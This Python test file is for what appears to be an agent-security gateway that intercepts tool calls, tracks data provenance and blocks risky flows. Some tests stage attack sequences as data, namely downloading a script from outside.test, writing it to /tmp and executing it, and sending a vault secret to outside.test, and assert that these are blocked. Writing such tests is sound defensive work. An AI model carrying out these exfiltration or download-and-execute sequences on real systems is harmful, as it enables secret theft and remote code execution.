from __future__ import annotations

from agentgate.adapters import FunctionToolAdapter, McpGateway, SidecarAdapter
from agentgate.capabilities import CapabilityInferer, OutputTrust, ToolCapability
from agentgate.events import (
    DataType,
    ResourceType,
    SecurityOperation,
    ToolExecutionResult,
)
from agentgate.graph import (
    AgentNode,
    AgentTransitionGraphBuilder,
    DataObjectNode,
    GraphEdgeType,
    ResourceNode,
    ToolEventNode,
    ToolEventStatus,
    TrustDomainNode,
)
from agentgate.labels import SecurityLabel
from agentgate.policy import DecisionAction
from agentgate.provenance import DependencyInference
from agentgate.runtime import RuntimeContext
from agentgate.semantics import SemanticResolution, StructuredSemanticResolver


class EmptyMcpUpstream:
    async def list_tools(self):
        return []

    async def call_tool(self, name, arguments):
        return {"name": name, "arguments": arguments}


async def test_adapters_normalize_heterogeneous_calls_to_one_canonical_shape(
    runtime_factory,
) -> None:
    runtime = runtime_factory().runtime
    context = RuntimeContext(
        principal="user",
        session_id="session",
        agent_id="agent-a",
        task_id="task-a",
        parent_call_id="parent",
    )
    function_call = await FunctionToolAdapter(runtime).intercept_request(
        {"tool_name": "crm.read", "arguments": {"id": "C1"}, "call_id": "call-1"},
        context,
    )
    sidecar_call = await SidecarAdapter(runtime).intercept_request(
        {"tool_name": "crm.read", "arguments": {"id": "C1"}, "call_id": "call-1"},
        context,
    )
    mcp_call = await McpGateway(
        runtime,
        EmptyMcpUpstream(),
        server_name="crm",
    ).intercept_request(
        {
            "jsonrpc": "2.0",
            "id": "call-1",
            "method": "tools/call",
            "params": {"name": "read", "arguments": {"id": "C1"}},
        },
        context,
    )

    for call in (function_call, sidecar_call, mcp_call):
        assert call.tool_name == "crm.read"
        assert call.call_id == "call-1"
        assert call.principal_id == "user"
        assert call.session_id == "session"
        assert call.agent_id == "agent-a"
        assert call.task_id == "task-a"
        assert call.parent_call_id == "parent"
        assert call.arguments == {"id": "C1"}
        assert call.source_framework
        assert call.source_transport


async def test_ambiguous_capability_uses_behavior_neutral_semantic_resolver() -> None:
    class Resolver:
        calls = 0

        async def resolve(self, **kwargs):
            self.calls += 1
            assert kwargs["reason"] == "multiple_operation_candidates"
            return SemanticResolution(
                operation=SecurityOperation.SEND,
                resource_type=ResourceType.NETWORK,
                destination_arg="endpoint",
                payload_args=["payload"],
                confidence=0.93,
                evidence=["description_and_schema_agree"],
            )

    resolver = Resolver()
    capability = await CapabilityInferer(semantic_resolver=resolver).infer(
        name="sync_workspace",
        description="Read a local export and upload it to an endpoint.",
        input_schema={
            "type": "object",
            "properties": {"endpoint": {"type": "string"}, "payload": {}},
        },
    )

    assert resolver.calls == 1
    assert capability.possible_operations == [SecurityOperation.SEND]
    assert capability.destination_arg == "endpoint"
    assert capability.source == "semantic_resolver"
    assert capability.resolution_metadata["resolver_called"] is True


async def test_structured_semantic_resolver_rejects_embedded_enforcement_decision() -> None:
    async def completion(**_):
        return {
            "operation": "READ",
            "confidence": 0.9,
            "evidence": [],
            "action": "ALLOW",
        }

    resolver = StructuredSemanticResolver(completion)
    try:
        await resolver.resolve(
            name="record.read",
            description="Read a record",
            input_schema={},
            output_schema={},
            candidates=[SecurityOperation.READ],
            reason="test",
        )
    except ValueError as exc:
        assert "action" in str(exc)
    else:
        raise AssertionError("resolver output must reject enforcement fields")


async def test_candidate_is_not_committed_and_failed_call_has_no_effect_relations(
    runtime_factory,
) -> None:
    runtime = runtime_factory().runtime

    async def fail(_):
        return ToolExecutionResult(success=False, error_type="IOError", error_message="no write")

    runtime.registry.register(
        ToolCapability(
            tool_name="file.write",
            possible_operations=[SecurityOperation.WRITE],
            resource_type=ResourceType.FILE,
            resource_arg="path",
            payload_args=["content"],
        ),
        fail,
    )
    context = RuntimeContext(principal="user", session_id="failed", task_id="task")
    preview = await runtime.evaluate(
        await FunctionToolAdapter(runtime).intercept_request(
            {"tool_name": "file.write", "arguments": {"path": "/tmp/x", "content": "x"}},
            context,
        )
    )
    graph = await runtime.graph_store.get_session_graph("user", "failed")
    assert preview.advisory_only
    assert graph.nodes == {}

    outcome = await runtime.execute(
        await FunctionToolAdapter(runtime).intercept_request(
            {"tool_name": "file.write", "arguments": {"path": "/tmp/x", "content": "x"}},
            context,
        )
    )
    graph = await runtime.graph_store.get_session_graph("user", "failed")
    event = next(node for node in graph.nodes.values() if isinstance(node, ToolEventNode))
    effect_edges = {
        GraphEdgeType.OPERATES_ON,
        GraphEdgeType.PRODUCES,
        GraphEdgeType.CONSUMES,
        GraphEdgeType.DERIVES_FROM,
        GraphEdgeType.TARGETS,
    }

    assert outcome.execution is not None and not outcome.execution.success
    assert event.status == ToolEventStatus.FAILED
    assert not any(
        isinstance(node, (ResourceNode, DataObjectNode, TrustDomainNode))
        for node in graph.nodes.values()
    )
    assert not any(edge.edge_type in effect_edges for edge in graph.edges.values())


async def test_labels_propagate_through_read_write_and_block_execute(runtime_factory) -> None:
    runtime = runtime_factory().runtime

    async def read(_):
        return {"content": "echo from outside"}

    async def write(_):
        return {"path": "/tmp/tool.sh"}

    async def execute(_):
        raise AssertionError("blocked tools must not execute")

    runtime.registry.register(
        ToolCapability(
            tool_name="web.read",
            possible_operations=[SecurityOperation.READ],
            resource_type=ResourceType.NETWORK,
            resource_arg="url",
            destination_arg="url",
            output_trust=OutputTrust.UNTRUSTED,
        ),
        read,
    )
    runtime.registry.register(
        ToolCapability(
            tool_name="file.write",
            possible_operations=[SecurityOperation.WRITE],
            resource_type=ResourceType.FILE,
            resource_arg="path",
            payload_args=["content"],
        ),
        write,
    )
    runtime.registry.register(
        ToolCapability(
            tool_name="shell.execute",
            possible_operations=[SecurityOperation.EXECUTE],
            resource_type=ResourceType.PROCESS,
            resource_arg="path",
        ),
        execute,
    )
    context = RuntimeContext(principal="user", session_id="flow", task_id="task")
    functions = FunctionToolAdapter(runtime)
    await functions.invoke(
        tool_name="web.read",
        arguments={"url": "https://outside.test/tool.sh"},
        context=context,
    )
    await functions.invoke(
        tool_name="file.write",
        arguments={"path": "/tmp/tool.sh", "content": "echo from outside"},
        context=context,
    )
    outcome = await functions.invoke(
        tool_name="shell.execute",
        arguments={"path": "/tmp/tool.sh"},
        context=context,
    )
    graph = await runtime.graph_store.get_session_graph("user", "flow")
    artifacts = [node for node in graph.nodes.values() if isinstance(node, DataObjectNode)]

    assert outcome.decision.action == DecisionAction.BLOCK
    assert {"untrusted_to_execute", "external_download_write_execute"}.issubset(
        outcome.decision.rule_ids
    )
    assert any(
        {SecurityLabel.UNTRUSTED, SecurityLabel.PERSISTENT_ARTIFACT}.issubset(node.labels)
        for node in artifacts
    )
    assert any(edge.edge_type == GraphEdgeType.DERIVES_FROM for edge in graph.edges.values())


async def test_cross_agent_same_task_data_flow_is_detected_but_other_task_isolated(
    runtime_factory,
) -> None:
    runtime = runtime_factory().runtime
    sent = 0

    async def read_secret(_):
        return {"secret": "shared-secret-value"}

    async def read_public(_):
        return {"status": "ok"}

    async def send(_):
        nonlocal sent
        sent += 1
        return {"sent": True}

    runtime.registry.register(
        ToolCapability(
            tool_name="vault.read",
            possible_operations=[SecurityOperation.READ],
            resource_type=ResourceType.CREDENTIAL,
            resource_arg="key",
            sensitive_output_types={DataType.SECRET},
        ),
        read_secret,
    )
    runtime.registry.register(
        ToolCapability(
            tool_name="status.read",
            possible_operations=[SecurityOperation.READ],
            sensitive_output_types={DataType.PUBLIC},
        ),
        read_public,
    )
    runtime.registry.register(
        ToolCapability(
            tool_name="http.send",
            possible_operations=[SecurityOperation.SEND],
            resource_type=ResourceType.NETWORK,
            destination_arg="url",
            payload_args=["body"],
        ),
        send,
    )
    functions = FunctionToolAdapter(runtime)
    parent = await functions.invoke(
        tool_name="vault.read",
        arguments={"key": "service"},
        context=RuntimeContext(
            principal="user", session_id="multi", task_id="task-1", agent_id="agent-a"
        ),
        call_id="parent-call",
    )
    assert parent.execution is not None
    await functions.invoke(
        tool_name="status.read",
        arguments={},
        context=RuntimeContext(
            principal="user",
            session_id="multi",
            task_id="task-1",
            agent_id="agent-b",
            parent_call_id="parent-call",
        ),
        call_id="child-call",
    )
    blocked = await functions.invoke(
        tool_name="http.send",
        arguments={"url": "https://outside.test", "body": "shared-secret-value"},
        context=RuntimeContext(
            principal="user", session_id="multi", task_id="task-1", agent_id="agent-b"
        ),
    )
    isolated = await functions.invoke(
        tool_name="http.send",
        arguments={"url": "https://outside.test", "body": "independent-public-value"},
        context=RuntimeContext(
            principal="user", session_id="multi", task_id="task-2", agent_id="agent-b"
        ),
    )
    graph = await runtime.graph_store.get_session_graph("user", "multi")

    assert blocked.decision.action == DecisionAction.BLOCK
    assert "sensitive_data_exfiltration" in blocked.decision.rule_ids
    assert isolated.decision.action == DecisionAction.AUDIT
    assert "sensitive_data_exfiltration" not in isolated.decision.rule_ids
    assert sent == 1
    assert len([node for node in graph.nodes.values() if isinstance(node, AgentNode)]) == 2
    assert any(edge.edge_type == GraphEdgeType.DELEGATES_TO for edge in graph.edges.values())
    assert any(edge.edge_type == GraphEdgeType.PARENT_OF for edge in graph.edges.values())


async def test_selective_dependency_resolver_can_add_high_confidence_graph_relation(
    runtime_factory,
) -> None:
    class Resolver:
        calls = 0

        async def resolve(self, *, sources, **_):
            self.calls += 1
            return [
                DependencyInference(
                    object_id=sources[0].object_id,
                    depends_on=True,
                    confidence=0.95,
                    rationale="The summary is declared to derive from this source object.",
                )
            ]

    runtime = runtime_factory().runtime
    resolver = Resolver()
    builder = AgentTransitionGraphBuilder(dependency_resolver=resolver)
    runtime.graph_builder = builder
    runtime.event_abstraction.graph_builder = builder

    async def read(_):
        return {"secret": "original-value"}

    async def send(_):
        raise AssertionError("resolved sensitive flow must be blocked")

    runtime.registry.register(
        ToolCapability(
            tool_name="vault.read",
            possible_operations=[SecurityOperation.READ],
            sensitive_output_types={DataType.SECRET},
        ),
        read,
    )
    runtime.registry.register(
        ToolCapability(
            tool_name="http.send",
            possible_operations=[SecurityOperation.SEND],
            destination_arg="url",
            payload_args=["body"],
        ),
        send,
    )
    context = RuntimeContext(principal="user", session_id="resolver", task_id="task")
    functions = FunctionToolAdapter(runtime)
    await functions.invoke(tool_name="vault.read", arguments={}, context=context)
    outcome = await functions.invoke(
        tool_name="http.send",
        arguments={"url": "https://outside.test", "body": "semantic-summary"},
        context=context,
    )

    assert resolver.calls == 1
    assert outcome.decision.action == DecisionAction.BLOCK
    assert any(item.startswith("llm_dependency:") for item in outcome.request_event.evidence)
